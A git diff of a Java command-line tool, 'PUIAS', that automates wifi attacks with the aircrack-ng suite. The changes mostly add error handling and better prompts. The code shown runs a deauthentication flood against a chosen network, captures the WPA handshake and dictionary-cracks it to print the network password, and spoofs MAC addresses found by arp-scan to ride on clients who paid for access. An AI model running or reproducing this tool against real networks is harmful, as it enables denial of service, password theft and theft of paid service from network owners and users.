@@ -65,10 +65,10 @@ class Main {
         File wireless_interface_file = new File("WI"); //wireless interface name file
         if (!wireless_interface_file.exists()) { //if file doesn't exist, create it and write wireless interface and monitor wireless interface to it
             BufferedWriter bufferedWriter = new BufferedWriter(new FileWriter(wireless_interface_file));
-            System.out.println("Enter wireless interface name in managed (normal) mode");
+            System.out.println("Enter wireless interface name in managed (normal) mode - this can typically be found by running ifconfig");
             bufferedWriter.write(scanner.nextLine());
             bufferedWriter.newLine();
-            System.out.println("Enter wireless interface name in monitor mode");
+            System.out.println("Enter wireless interface name in monitor mode (usually the managed mode with \"mon\" at the end)");
             bufferedWriter.write(scanner.nextLine());
             bufferedWriter.close();
         }
@@ -103,138 +103,154 @@ class Main {
         System.out.println("Success! PUIAS has been successfully started ");
         String in = "";
 
-        while (!in.equals("exit")) {
+        try {
 
-            System.out.println("----------------------------------------------------"); //print options
-            System.out.println("|Hello what would you like to do today?            |");
-            System.out.println("|                                                  |");
-            System.out.println("|                                                  |");
-            System.out.println("|edit - edit wireless card name (currently: " + wi + ")|");
-            System.out.println("|                                                  |");
-            System.out.println("| 1 - launch deauth attack                         |");
-            System.out.println("| 2 - launch WPA attack                            |");
-            System.out.println("| 3 - launch MAC spoofing attack                   |");
-            System.out.println("|                                                  |");
-            System.out.println("| exit - exit (really?)                            |");
-            System.out.println("----------------------------------------------------");
+            while (!in.equals("exit")) {
 
-            in = scanner.nextLine();
+                System.out.println("----------------------------------------------------"); //print options
+                System.out.println("|Hello what would you like to do today?            |");
+                System.out.println("|                                                  |");
+                System.out.println("|                                                  |");
+                System.out.println("|edit - edit wireless card name (currently: " + wi + ")|");
+                System.out.println("|                                                  |");
+                System.out.println("| 1 - launch deauth attack                         |");
+                System.out.println("| 2 - launch WPA attack                            |");
+                System.out.println("| 3 - launch MAC spoofing attack                   |");
+                System.out.println("|                                                  |");
+                System.out.println("| exit - exit (really?)                            |");
+                System.out.println("----------------------------------------------------");
 
-            if (in.equals("edit")) { //change wireless card name
-                //noinspection ResultOfMethodCallIgnored
-                wireless_interface_file.delete();
-                System.exit(0);
-            }
-            if (in.equals("1")) { //deauth mode
-                String[] network = getNetwork(); //get network to deauth
-                String bss = network[0];
-                @SuppressWarnings("unused") String ess = network[1];
-                String ch = network[2];
+                in = scanner.nextLine();
 
-
-                System.out.println("Only deauth all is currently supported, press 1 to confirm");
-                String p = scanner.nextLine();
-
-                if (p.equals("1")) {
-                    setChanel(ch); //set chanel
-                    executeNewWindow("aireplay-ng -0 0  -a " + bss + " " + mwi, true); //run deauth
-                    System.out.println("press enter when done"); //wait until deauth is done
-                    scanner.nextLine();
-                }
-
-                //TODO: add targeted deauth
-
-//                if (p.equals("2")) {
-
-//                }
-                stopMonitorMode();
-            }
-            if (in.equals("2")) {//wpa attack mode
-                String[] network = getNetwork(); //get target network
-                String bss = network[0];
-                //noinspection unused
-                String ess = network[1];
-                String ch = network[2];
-
-                executeNewWindow("airodump-ng -c " + ch + " -w " + scriptDIR + "tg" + File.separator + "tg" + " --bssid " + bss + " " + mwi, true); //get networks 4-way handshake
-
-                System.out.println("attempt to de-auth clients? ");//to force handshake deauth may be used
-                if (scanner.nextLine().toLowerCase().equals("y")) {
-                    executeNewWindow("aireplay-ng -0 0  -a " + bss + " " + mwi, true); //run de-auth
-                }
-
-                System.out.println("press enter when done"); //wait until handshake file is created
-                scanner.nextLine();
-
-                try {
-                    Thread.sleep(100);
-                } catch (InterruptedException e) {
-                    e.printStackTrace();
-                }
-
-                File[] tgscans = new File(scriptDIR + "tg").listFiles(pathname -> pathname.getAbsolutePath().endsWith("cap"));
-                assert tgscans != null;
-                Arrays.sort(tgscans);
-                File lasttg_scan = tgscans[tgscans.length - 1]; //get the latest scan
-
-                execute("chmod 777 " + lasttg_scan.getAbsolutePath(), true); //allow editing of file
-                System.out.println("got handshake");
-
-                String passwd_list = getPasswordList();
-
-                System.out.println("aircrack-ng -l netpass -w " + passwd_list + " -b " + bss + " " + lasttg_scan.getAbsolutePath());
-
-                executeNewWindow("aircrack-ng -l netpass -w " + passwd_list + " -b " + bss + " " + lasttg_scan.getAbsolutePath(), true); //crack password and save password to file
-                //TODO: add john the ripper custom password list generation
-
-                System.out.println("press enter when done");//wait for aircrack
-                scanner.nextLine();
-
-                try {
-                    File pass = new File("netpass");
-                    BufferedReader npassbr = new BufferedReader(new FileReader(pass));
-                    System.out.println("Password: " + npassbr.readLine());//print password
-                    npassbr.close();
-
+                if (in.equals("edit")) { //change wireless card name
                     //noinspection ResultOfMethodCallIgnored
-                    pass.delete();
-                    BufferedWriter bufferedWriter = new BufferedWriter(new FileWriter(pass));
-                    bufferedWriter.write("Error"); //write error in file so if next time aircrack is quit before it found the password no password would be returned
+                    wireless_interface_file.delete();
+                    System.exit(0);
+                }
+                if (in.equals("1")) { //deauth mode
+                    String[] network = getNetwork(); //get network to deauth
+                    String bss = network[0];
+                    @SuppressWarnings("unused") String ess = network[1];
+                    String ch = network[2];
+
+
+                    System.out.println("Only deauth all is currently supported, press 1 to confirm");
+                    String p = scanner.nextLine();
+
+                    if (p.equals("1")) {
+                        setChanel(ch); //set chanel
+                        executeNewWindow("aireplay-ng -0 0  -a " + bss + " " + mwi, true); //run deauth
+                        System.out.println("press enter when done"); //wait until deauth is done
+                        scanner.nextLine();
+                    }
+
+                    //TODO: add targeted deauth
+
+                    stopMonitorMode();
+                }
+                if (in.equals("2")) {//wpa attack mode
+                    String[] network = getNetwork(); //get target network
+                    String bss = network[0];
+                    //noinspection unused
+                    String ess = network[1];
+                    String ch = network[2];
+
+                    executeNewWindow("airodump-ng -c " + ch + " -w " + scriptDIR + "tg" + File.separator + "tg" + " --bssid " + bss + " " + mwi, true); //get networks 4-way handshake
+
+                    System.out.println("attempt to de-auth clients? ");//to force handshake deauth may be used
+                    if (scanner.nextLine().toLowerCase().equals("y")) {
+                        executeNewWindow("aireplay-ng -0 0  -a " + bss + " " + mwi, true); //run de-auth
+                    }
+
+                    System.out.println("press enter when done"); //wait until handshake file is created
+                    scanner.nextLine();
+
+                    try {
+                        Thread.sleep(100);
+                    } catch (InterruptedException e) {
+                        e.printStackTrace();
+                    }
+
+                    File[] tgscans = new File(scriptDIR + "tg").listFiles(pathname -> pathname.getAbsolutePath().endsWith("cap"));
+                    assert tgscans != null;
+                    Arrays.sort(tgscans);
+                    File lasttg_scan = tgscans[tgscans.length - 1]; //get the latest scan
+
+                    execute("chmod 777 " + lasttg_scan.getAbsolutePath(), true); //allow editing of file
+                    System.out.println("got handshake");
+
+                    String passwd_list = getPasswordList();
+
+                    System.out.println("aircrack-ng -l netpass -w " + passwd_list + " -b " + bss + " " + lasttg_scan.getAbsolutePath());
+
+                    executeNewWindow("aircrack-ng -l netpass -w " + passwd_list + " -b " + bss + " " + lasttg_scan.getAbsolutePath(), true); //crack password and save password to file
+                    //TODO: add john the ripper custom password list generation
+
+                    System.out.println("press enter when done");//wait for aircrack
+                    scanner.nextLine();
+
+                    try {
+                        File pass = new File("netpass");
+                        BufferedReader npassbr = new BufferedReader(new FileReader(pass));
+                        System.out.println("Password: " + npassbr.readLine());//print password
+                        npassbr.close();
+
+                        //noinspection ResultOfMethodCallIgnored
+                        pass.delete();
+                        BufferedWriter bufferedWriter = new BufferedWriter(new FileWriter(pass));
+                        bufferedWriter.write("Error"); //write error in file so if next time aircrack is quit before it found the password no password would be returned
 
 //                execute(scriptDIR+"hashcat-utils-master/src/cap2hccapx.bin "+lasttg_scan.getAbsolutePath()+" "+lasttg_scan.getAbsolutePath().replace(".cap",".hccapx"),false);
 //TODO: add gpu cracking support with hashcat
-                } catch (Exception ignored) {
-                    System.out.println("Error");
-                }
-
-                stopMonitorMode();//exit monitor mode
-
-            }
-            if (in.equals("3")) {
-                ArrayList<String> macs = execute("arp-scan -l", true); //get all mac addresses via arp-scan
-                macs.remove(0); //remove headers
-                macs.remove(0);
-                macs.remove(macs.size() - 1);
-                macs.remove(macs.size() - 1);
-                macs.remove(macs.size() - 1);
-                System.out.println(macs.size() + " possible targets found: ");
-                for (int i = 0; i < macs.size(); i++) {
-                    macs.set(i, macs.get(i).split("\t")[1]); //add mac to arraylist
-                    System.out.println(macs.get(i)); //print said mac
-                }
-                boolean success = false;
-                for (String mac : macs) {
-                    if (trymac(mac)) { //try each mac
-                        success = true;
-                        System.out.println("success! " + mac); //mac successful, print it
-                        break;
+                    } catch (Exception ignored) {
+                        System.out.println("Error");
                     }
-                }
-                if (!success) {
-                    System.out.println("Sorry, either no one purchased wifi or there is a bug in the program, try again later");
-                }
 
+                    stopMonitorMode();//exit monitor mode
+
+                }
+                if (in.equals("3")) {
+                    ArrayList<String> macs = execute("arp-scan -l", true); //get all mac addresses via arp-scan
+                    macs.remove(0); //remove headers
+                    macs.remove(0);
+                    macs.remove(macs.size() - 1);
+                    macs.remove(macs.size() - 1);
+                    macs.remove(macs.size() - 1);
+                    System.out.println(macs.size() + " possible targets found: ");
+                    for (int i = 0; i < macs.size(); i++) {
+                        macs.set(i, macs.get(i).split("\t")[1]); //add mac to arraylist
+                        System.out.println(macs.get(i)); //print said mac
+                    }
+                    boolean success = false;
+                    for (String mac : macs) {
+                        if (trymac(mac)) { //try each mac
+                            success = true;
+                            System.out.println("success! " + mac); //mac successful, print it
+                            break;
+                        }
+                    }
+                    if (!success) {
+                        System.out.println("Sorry, either no one purchased wifi or there is a bug in the program, try again later");
+                    }
+
+                }
             }
+        } catch (Exception e) {
+            for (int i = 0; i < 10; i++) {
+                System.out.println();
+            }
+            System.out.println("An unexpected error has occurred. We will now attempt to reset your wireless card.");
+            try {
+                stopMonitorMode();
+                System.out.println("We were successfully able to reset your wireless card.");
+            } catch (Exception exception) {
+                System.out.println("We were unable to reset your wireless card. You may attempt to do so manually using the following commands:");
+                System.out.println("sudo airmon-ng stop " + mwi);
+                System.out.println("service network-manager restart");
+            } finally {
+                System.exit(-1);
+            }
+
         }
     }
 
@@ -253,9 +269,7 @@ class Main {
             System.out.println(i + ") " + l.getName());
         }
         String pl = scanner.nextLine();
-//        if(pl.equals("c")){
-//
-//        }
+
         return files[Integer.parseInt(pl) - 1].getAbsolutePath();
     }
 
@@ -263,10 +277,11 @@ class Main {
      * Get details about network to attack
      *
      * @return bssid, essid, chanel
-     * @throws IOException error
+     * @throws UnknownError unexpected error. Examples include: no networks in area & invalid network number.
      */
 
-    private static String[] getNetwork() throws IOException {
+    private static String[] getNetwork() throws UnknownError {
+        try {
         startMonitorMode();
         String scans_path = scriptDIR + "scans" + File.separator + "scans"; //deauth initial scan absolote path
         executeNewWindow("airodump-ng  -w " + scans_path + " --output-format csv " + mwi, true);//scan networks and get bssid and essid
@@ -318,7 +333,9 @@ class Main {
         String ess = essids.get(sn);
         String ch = chs.get(sn);
         System.out.println("Selected network: " + ess + " with a bssid: " + bss + " and a chanel: " + ch);
-        return new String[]{bss, ess, ch};
+        return new String[]{bss, ess, ch};} catch (Exception e){
+            throw new UnknownError();
+        }
     }
 
     /**
@@ -331,7 +348,7 @@ class Main {
     }
 
     /**
-     * Set monitor wireless card chanel
+     * Set monitor wireless card channel
      *
      * @param ch chanel to set
      */
@@ -433,7 +450,7 @@ class Main {
 
             for (int i = 0; i < 60 && p.isAlive(); i++) {
                 Thread.sleep(1000);
-                if(i==30){
+                if (i == 30) {
                     System.out.println("This is command is taking a larger than usual time to execute, we will continue attempting to execute it but if after another 30 seconds it wont quit we will force it");
                 }
             }
